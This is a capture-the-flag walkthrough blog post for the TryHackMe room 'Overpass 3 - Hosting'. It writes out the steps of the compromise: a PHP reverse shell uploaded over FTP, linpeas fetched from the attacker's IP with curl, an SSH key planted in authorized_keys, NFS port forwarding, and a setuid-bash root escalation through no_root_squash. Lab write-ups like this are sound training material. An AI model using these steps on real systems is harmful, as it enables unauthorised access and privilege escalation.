---
layout: post
title: "Overpass 3 - Hosting"
date: 2022-10-22
categories: [Tryhackme, Easy-THM]
tags: [gpg, ssh-keygen, nfs, port-forwarding]
image: ../../assets/img/posts/overpass3hosting.png 

---

## Description

You know them, you love them, your favourite group of broke computer science students have another business venture! Show them that they probably should hire someone for security...

|**Room**|[Overpass 3 - Hosting](https://tryhackme.com/room/overpass3hosting)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Medium|
|**Creator**|[NinjaJc01](https://tryhackme.com/p/NinjaJc01)|

---

Starting off with deploying the machine, exporting IP address and quickly scanning the open ports with rustscan,

```bash
export IP=10.10.48.114
rustscan -a $IP --range 0-65535 --ulimit 5000 -- -sVC -oN nmap.log
```

![image](https://user-images.githubusercontent.com/67465230/187019269-1e6465c0-5815-413d-ad0c-0251d94d553a.png)

Result scan shows that port 21 is running vsftpd service, port 22 is running ssh service, port 80 is running apache web server, port 111 is filtered by firewall.

Let's start enumeration by visiting http://$IP and we land on a page where information regarding Overpass,

![image](https://user-images.githubusercontent.com/67465230/187019305-6c2209aa-26ef-477e-bb94-5a8c0e168014.png)

Looking at the comment, we can see five nines but I don't really know what's the deal with this comment,

![image](https://user-images.githubusercontent.com/67465230/187019313-58859f05-12c5-44e1-b091-00cfc39ec8c7.png)

But whatever, let's focus on fuzzing the directory,

```bash
gobuster dir -u http://10.10.162.197/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -q 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187019322-20d5a740-93d5-4780-bbe1-33807baedb12.png)

Let's navigate to http://$IP/backups and we will get a zip file,

![image](https://user-images.githubusercontent.com/67465230/187019332-1622fa39-a87e-4728-a145-aa75a365c01a.png)

Let's extract the content of the zip file,

```bash
unzip backup.zip
ls -la 
```

![image](https://user-images.githubusercontent.com/67465230/187019341-06559d13-fda4-4765-9326-d5035b68fec9.png)

there are 2 files named CustomerDetails.xlsx.gpg and priv.key. 

We have a gpg and private key so let's decrypt it. I found a resource using which we can decrypt the key, [gpg-encrypt-decrypt](https://www.thegeekstuff.com/2013/02/gpg-encrypt-decrypt/). Let's import this private key so that we can decrypt it,

```bash
gpg --import priv.key
```

![image](https://user-images.githubusercontent.com/67465230/187019352-0fd9e015-7b62-4990-9a37-e434cba7751e.png)

Now since we have encrypted file, in order to view the file content, we need to decrypt the file. If we decrypt the file, it gets easily decrypted because we imported the private key,

```bash
gpg -d CustomerDetails.xlsx.gpg > CustomerDetails.xlsx
ls
file CustomerDetails.xlsx
```

![image](https://user-images.githubusercontent.com/67465230/187019364-a9d38e6f-9d09-4986-972a-66052ed9bf9a.png)

using the `file` command, we get to know that it is a excel file.

Opening the file in online excel, we can now see the credentials of the users paradox, 0day, and muirlandoracle,

![image](https://user-images.githubusercontent.com/67465230/187019382-e1b52c6f-dffe-49c7-9125-8c57869581fb.png)

I tried to ssh on all users but from there, I didn't got any user access,

```bash
ssh paradox@10.10.162.197
ssh 0day@10.10.162.197
ssh muirlandoracle@10.10.162.197
```

![image](https://user-images.githubusercontent.com/67465230/187019388-10777b37-0481-456f-bf47-2ae9f8f35ece.png)

I tried accessing the ftp directory and got successfully into it as paradox user,

```bash
ftp 10.10.162.197
ls -la
```

![image](https://user-images.githubusercontent.com/67465230/187019391-00c50fb6-6a20-446d-87b9-438787b85a62.png)

Listing the files and there I saw that there is a backup directory and which is similar to the files we saw in webserver. 

Maybe we can put files here. So let's try to put a random text file here,

```bash
echo 'Hello Hellfire' > file.txt
ftp 10.10.162.197
put file.txt
```

![image](https://user-images.githubusercontent.com/67465230/187019400-a6522ec7-f828-43a0-899f-d9ced0cfbea8.png)

Now, let's navigate to http://$IP/file.txt and we can see the text file we put before, 

![image](https://user-images.githubusercontent.com/67465230/187019431-c6f421de-eaed-4a29-81a9-8d1e5c5e871b.png)

Let's see if we can upload a php file containing text,

```bash
echo '<?php echo "Hello Hellfire" ?>' > file.php
ftp 10.10.162.197
put file.php
```

![image](https://user-images.githubusercontent.com/67465230/187019536-9d922c1e-e511-47c6-96aa-1fcdb8224b26.png)

Navigating to http://$IP/file.php and we can see the text we wrote on the file,

![image](https://user-images.githubusercontent.com/67465230/187019566-5fcd3d91-91ec-4543-8fdb-723a7853aed8.png)

Wonderful, now let's upload our reverse shell. The reverse shell can be found here, [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell)

```bash
ftp 10.10.162.197
put php-reverse-shell.php
```

![image](https://user-images.githubusercontent.com/67465230/187019578-1871e67c-4ad1-472e-a739-8680bc9fa318.png)

Let's start the netcat listener using `nc -nvlp 4444` and let's issue the request to the path where we uploaded the shell,

```bash
curl http://10.10.162.197/php-reverse-shell.php
```

After issuing the request, we will immediately get the reverse shell,

![image](https://user-images.githubusercontent.com/67465230/187019587-6fbf222e-0346-4df2-9ba0-c265a8570767.png)

Since this is an unstable shell so let's make this a stable one, 

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL + Z
stty raw -echo; fg
stty rows 56 columns 238
```

I was trying to download the linpeas file on the system using `wget`, but can't since the command is not installed. So I tried to download the file using `curl` command and got successful,

```bash
curl http://10.9.11.12:8000/linPEAS -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Scrolling down the result of linpeas, I can see that there is a web.flag file in `/usr/share/httpd` path,

![image](https://user-images.githubusercontent.com/67465230/187019638-6f196200-a387-4123-b4df-614309157c59.png)

Now, navigating to home directory and there we can see that there are 2 directories of users, i.e. james and paradox,

![image](https://user-images.githubusercontent.com/67465230/187019645-b693293d-3d78-4b07-a520-a0958151fba7.png)

I tried to change the directory and got permission denied, and tried to switch to james user and got Authentication failure as well,

```bash
cd james
su james
```

![image](https://user-images.githubusercontent.com/67465230/187019652-1a2e4197-72d5-46c5-9ca3-a8779b49d466.png)

Then I tried to switch to paradox user using the password we get into the system and we successfully switched to paradox user,

```bash
su paradox
id
```

![image](https://user-images.githubusercontent.com/67465230/187019656-f9c74bc6-292c-41f6-902e-57870ba65602.png)

listing the directory of paradox user, we can see the .ssh directory, 

![image](https://user-images.githubusercontent.com/67465230/187019673-f51de7ed-e697-40f8-8e9c-f71e25a917c1.png)

I navigated into the .ssh directory and found that there are 2 keys, namely authorized_keys and id_rsa.pub key, 

![image](https://user-images.githubusercontent.com/67465230/187019680-ab24900b-a69e-4bcd-a23a-0fb59a51bb53.png)

Since there was no private key, we need to generate new pair, so I used `ssh-keygen` command to generate a new pair of ssh keys,

```bash
ssh-keygen -f paradox
```

![image](https://user-images.githubusercontent.com/67465230/187019688-4801b236-43e9-4375-9725-4668f8c72770.png)

The new pair of keys are generated and we can paste our paradox.pub-key into the authorized_keys, 

```bash
echo "<paradox.pub-key>" > authorized_keys
```

Now, let's give the suitable permissions to the key and ssh into the machine as paradox user and will get the shell access,

```bash
chmod 600 paradox
ssh -i paradox paradox@10.10.59.70
```

![image](https://user-images.githubusercontent.com/67465230/187019704-44c2127e-1326-4264-b112-c399505b43ad.png)

Again running the linpeas & scrolling down the result, we can see the yellow highlighted part displaying **no_root_squash**. If we don't have root squash that means the `/home/james` directory is shareable and can be mounted,

![image](https://user-images.githubusercontent.com/67465230/187019712-b1d64f24-be8d-41cf-99d2-efb967483ba1.png)

We have a NFS mount! But we didn’t see NFS anywhere on the nmap scan! This tells us that the port is probably behind a firewall. A quick google search tells us that `fsid=0` means that we are using `NFSv4` here. This is good, as we only have 1 port to worry about. 

Let's check if we can list the mount the /home/james user, but we can't,

```bash
showmount -e
showmount -e 10.9.11.12
```

![image](https://user-images.githubusercontent.com/67465230/187019715-76f8f3e2-0381-4e39-b070-98b03b3061f5.png)

If we check the Nmap result from the full port scan, the port listening for NFS, i.e. 2049 was closed. So let's check if the  port is internally open using `ss` command, 

```bash
ss -ln | grep tcp
```

![image](https://user-images.githubusercontent.com/67465230/187019727-932af586-dbd2-4bbd-9645-9669dd46550b.png)

Since we know that port is internally open, we can port forward this port on our attacker machine, 

```bash
ssh -fNL 2049:localhost:2049 -i paradox paradox@10.10.59.70

# -N : Do not execute a remote command.  This is useful for just forwarding ports.
# -L : Specifies that connections to the given TCP port on the local (client) host are to be forwarded to the given host and port, on the remote side.
# -f : Requests ssh to go to background just before command execution. This is useful if ssh is going to ask for passwords or passphrases, but the user wants it in the background.
```

![image](https://user-images.githubusercontent.com/67465230/187019736-508eed7b-5a06-4371-bed8-214fa3c86807.png)

Now, that we have set up the port forward, let's make a directory in /tmp and mount the directory. Let's move into the directory and we can list the home directory and see the user flag,

```bash
mkdir mnt
sudo mount -t nfs4 localhost:/ mnt
cd mnt
ls -la
```

![image](https://user-images.githubusercontent.com/67465230/187019743-693d144b-f74d-4c77-be68-7f97a36bbcba.png)

Listing the directory and there I saw a hidden ssh directory so I decided to move into it and there I see the pair of ssh keys which is of james user,

```bash
cd .ssh
ls -la
```

![image](https://user-images.githubusercontent.com/67465230/187019750-5c4e904f-9065-43dc-bc39-aca3a747e1ca.png)

I assign the suitable permission for this private key of james user and then ssh into the machine and successfully got into the system,

```bash
chmod 600 id_rsa
ssh -i id_rsa james@10.10.59.70
```

![image](https://user-images.githubusercontent.com/67465230/187019761-4d01e5f1-ef3b-47b3-9378-2693145c0d4e.png)

I first tried to copy the `bash` binary from my Kali box to the NFS share, but it failed to execute on the target. I then tried to copy the version of bash to user `james`' home directory and it worked. On the target, as `james`, I first copied the `bash` binary to the home folder,

```bash
cp /bin/bash .
sudo chown root:root ./bash
sudo chmod +s ./bash
ls -la
```

![image](https://user-images.githubusercontent.com/67465230/187019774-c5baf3e5-1c6d-48ab-9c7a-dd8288fafe40.png)

Let's make the whole directory have read-executable permissions, 

```bash
chmod +rx .
ls -la
```

![image](https://user-images.githubusercontent.com/67465230/187019783-d20baa28-bd60-4887-9741-9ef1bda28e50.png)

Running this binary file from paradox user and we get the root access,

```bash
/home/james/bash -p
id
```

![image](https://user-images.githubusercontent.com/67465230/187019800-8be6ed87-5056-4265-b8d7-5f6f1e2d575f.png)
